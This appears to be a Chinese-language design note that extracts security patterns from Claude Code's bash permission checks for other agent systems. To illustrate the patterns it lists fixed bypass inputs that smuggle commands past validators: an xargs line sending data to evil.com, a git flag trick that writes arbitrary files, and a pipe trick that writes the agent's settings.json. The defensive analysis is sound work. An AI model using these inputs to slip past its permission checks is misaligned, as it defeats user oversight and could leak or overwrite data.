# Phase 6 — 08 安全設計模式提煉

本文件提煉 Claude Code 安全架構中可遷移到其他 agent 系統的設計模式。

---

## 模式 1：縱深防禦（Defense-in-Depth）

**原則**：多層獨立安全門，每層假設其他層可能失效。

**實作**：
```
AI Policy → AST Parse → Static Validators → Rule Engine → Path Constraints → OS Sandbox
```

**可遷移要點**：
- 每層只負責自己的安全邊界，不假設其他層已處理
- 層次間通過標準化接口（`PermissionResult`）通訊
- 最外層（OS sandbox）是最後防線，不依賴任何應用層邏輯

---

## 模式 2：Fail-Closed 原則

**原則**：不確定時拒絕，要求使用者明確授權。

**實作**：
```typescript
// 無法解析命令 → 要求許可（不是自動允許）
if (parseResult.kind === 'too-complex') {
  return { behavior: 'ask', ... }
}

// 子命令超過上限 → 要求許可
if (subcommands.length > MAX_SUBCOMMANDS) {
  return { behavior: 'ask', ... }
}
```

**可遷移要點**：
- 解析失敗不等於安全
- 不確定性本身就是安全訊號
- 閾值超出時保守處理

---

## 模式 3：Deny 優先（Deny-First）

**原則**：Deny 規則永遠優先於 Allow 規則，防止 Allow 規則繞過。

**實作**：
```typescript
// 精確匹配：deny → ask → allow
if (matchingDenyRules[0]) return deny
if (matchingAskRules[0]) return ask
if (matchingAllowRules[0]) return allow

// 複合命令：全命令 deny 後才看 ask
for (const sub of subcommands) {
  if (subDeny) return deny  // 立即返回
}
if (firstAskRule) return ask  // 所有 deny 確認完後
```

**可遷移要點**：
- Deny 的優先順序要高於 Ask，Ask 高於 Allow
- 複合命令要逐子命令檢查 deny，不能只看整體
- 「降級」（deny → ask）需要明確的安全論證

---

## 模式 4：Env Var 剝除的非對稱性

**原則**：Allow 規則只剝除安全的 env var；Deny 規則剝除所有 env var。

**動機**：`DOCKER_HOST=evil.com docker ps` 應該匹配 `Bash(docker ps:*)` 的 deny rule，但 allow rule 需要謹慎（防止 `DOCKER_HOST=evil.com` 讓 `docker ps:*` allow 生效而造成危害）。

**實作**：
```typescript
// Allow 規則：只剝除 SAFE_ENV_VARS（已知安全的 30+ 個）
filterRulesByContents(input, allowRules, 'prefix', { stripAllEnvVars: false })

// Deny/Ask 規則：剝除所有 env var
filterRulesByContents(input, denyRules, 'prefix', { stripAllEnvVars: true })
```

**絕對禁止進入安全列表**：`PATH`, `LD_PRELOAD`, `PYTHONPATH`, `NODE_OPTIONS` 等可影響執行環境的變數。

---

## 模式 5：Parser Differential 防禦

**原則**：當解析器 A 和 B 對同一輸入的解釋不同時，攻擊者可以利用這個差異繞過 A 的安全檢查，讓 B 執行惡意操作。

**已知攻擊向量（均已修復）：**

| 輸入 | shell-quote 解釋 | bash 解釋 | 攻擊效果 |
|------|----------------|-----------|---------|
| `TZ=UTC\recho cmd` | `TZ=UTC + echo + cmd` | `TZ=UTC\recho + cmd` | 執行 `cmd` 而非 `echo` |
| `cat x \; echo /etc/passwd` | `cat x ; echo /etc/passwd` | `cat x` + `\; echo /etc/passwd` | 路徑驗證失效 |
| `echo\ test/../../../usr/bin/touch` | `echo test/.../touch` | `/usr/bin/touch` | 路徑遍歷 |
| `echo "x\\"` + `\; leak` | tracker 認為仍在引號內 | `echo "x\"` + 後續命令 | quote tracker 去同步 |

**防禦模式**：
1. 偵測差異（`isBashSecurityCheckForMisparsing: true`）
2. 有差異時立即阻擋，不繼續後續處理
3. Tree-sitter AST 作為更準確的解析器，減少差異

---

## 模式 6：多版本 Quote Tracker

**原則**：同一命令需要多個「視角」來偵測不同的攻擊。

**實作**：
```typescript
type ValidationContext = {
  originalCommand: string          // 原始命令（未處理）
  unquotedContent: string          // 保留雙引號內容，去除單引號（withDoubleQuotes）
  fullyUnquotedContent: string     // 去除兩種引號（+ stripSafeRedirections）
  fullyUnquotedPreStrip: string    // 去除兩種引號（不 strip redirections）
  unquotedKeepQuoteChars: string   // 去除引號內容但保留引號分隔符
}
```

**每個 validator 使用不同視角：**
- `validateDangerousPatterns`：用 `unquotedContent`（雙引號內的 `$()` 也危險）
- `validateRedirections`：用 `fullyUnquotedContent`（去除的更徹底）
- `validateMidWordHash`：用 `unquotedKeepQuoteChars`（保留引號符號以偵測 `'x'#`）
- `validateBraceExpansion`：用 `fullyUnquotedPreStrip`（避免 strip 後產生假的反斜線）

---

## 模式 7：白名單旗標驗證（allowlist-only flags）

**原則**：對於應該是「唯讀」的命令，精確列舉所有允許的旗標，任何未知旗標一律拒絕。

**實作**：
```typescript
type FlagArgType = 'none' | 'string' | 'number' | 'char' | '{}' | 'EOF'

validateFlags(args: string[], safeFlags: Record<string, FlagArgType>): boolean
// 遇到不在 safeFlags 的旗標 → return false（不安全）
```

**特殊案例（值得注意的設計）：**

1. `git diff -S` 必須是 `'string'`（不是 `'none'`）：
   - 若設為 `'none'`，`git diff -S -- --output=/tmp/pwned` 中
   - validator 認為 `-S` 無引數，`--` 成為選項終止符
   - 但 git 的 getopt 把 `--` 當成 `-S` 的引數，解析 `--output=` → 任意檔案寫入

2. `xargs -i`/`-e` 必須排除（optional-arg 語義歧義）：
   - `echo /sbin/cmd | xargs -it tail user@evil.com`
   - validator：`-it` bundle，tail 在白名單 → 允許
   - GNU xargs：`-i` 需要 attached arg，`t` 是 replace-str → 執行 `/sbin/cmd` → 網路外洩

3. `fd --list-details`（`-l`）必須排除：
   - 內部呼叫系統 `ls` 子程序（`--exec-batch` 相同路徑）
   - 若 PATH 被污染，可執行惡意 `ls`

---

## 模式 8：可疑路徑模式偵測（而非正規化）

**原則**：偵測可疑模式並要求手動批准，而非嘗試正規化路徑。

**原因**：
1. 正規化依賴檔案系統狀態（新檔案不存在，無法正規化短名稱）
2. TOCTOU 競爭條件（正規化後狀態可能改變）
3. Windows 特有 API，跨平台困難
4. 偵測更可預測，不依賴外部狀態

**偵測的模式：**
- NTFS ADS（`:` 語法）
- 8.3 短名稱（`~\d`）
- Long path prefix（`\\?\`）
- 尾部點/空格（Windows 等同去除後的路徑）
- DOS device names
- 三個以上連續點
- UNC 路徑

---

## 模式 9：Speculative / Race 許可模式

**原則**：在使用者看到對話框的同時，背景執行 AI classifier，兩者賽跑。

**效益**：減少使用者等待時間（classifier 可能在使用者反應前就完成）。

**安全保證**：
```typescript
// ResolveOnce 確保第一個決策源生效，其他被忽略
const resolveOnce = createResolveOnce(resolve)

// classifier 完成 → 嘗試 claim()
if (resolveOnce.claim()) {
  resolveOnce.resolve(classifierDecision)
}

// 使用者點擊 → 嘗試 claim()
onAllow(() => {
  if (resolveOnce.claim()) {
    resolveOnce.resolve(userDecision)
  }
})
```

---

## 模式 10：複合命令的分層驗證

**原則**：複合命令（`&&`, `||`, `|`, `;`）必須逐子命令驗證，整體匹配容易被繞過。

**實作要點**：
1. Allow 規則的前綴匹配不應匹配複合命令
2. Deny/Ask 規則必須能匹配複合命令中的個別子命令
3. 管線（`|`）的安全重導向需要額外驗證（`>` 可能在整體命令中，不在個別 segment）

**典型繞過案例**：
```bash
cd .claude && echo x > settings.json | echo done
```
- `| echo done` 讓整體命令走管線路徑
- 若管線路徑不再檢查重導向 → `settings.json` 被寫入

---

## 可遷移 Checklist

設計新的 agent 工具安全系統時，以下要點值得考量：

- [ ] **Fail-Closed 預設**：解析失敗、不確定狀態都回傳「需要許可」
- [ ] **Deny 優先順序**：deny > ask > allow，且要處理複合命令
- [ ] **Parser Differential**：識別所有 parser 差異點，差異 = 要求許可
- [ ] **引號感知解析**：多種「視角」偵測不同攻擊
- [ ] **Env var 非對稱剝除**：allow rule 謹慎，deny rule 激進
- [ ] **白名單旗標驗證**：特別注意 optional-arg 語義和引數消耗差異
- [ ] **路徑偵測而非正規化**：可疑 Windows 路徑模式、symlink 防繞過
- [ ] **規則推薦機制**：讓使用者形成 institutional memory（不只是點一次允許）
- [ ] **多決策源賽跑**：hook + AI classifier + user，ResolveOnce 保護
- [ ] **複合命令分層**：pipeline 中的重導向需要整體命令層級的驗證
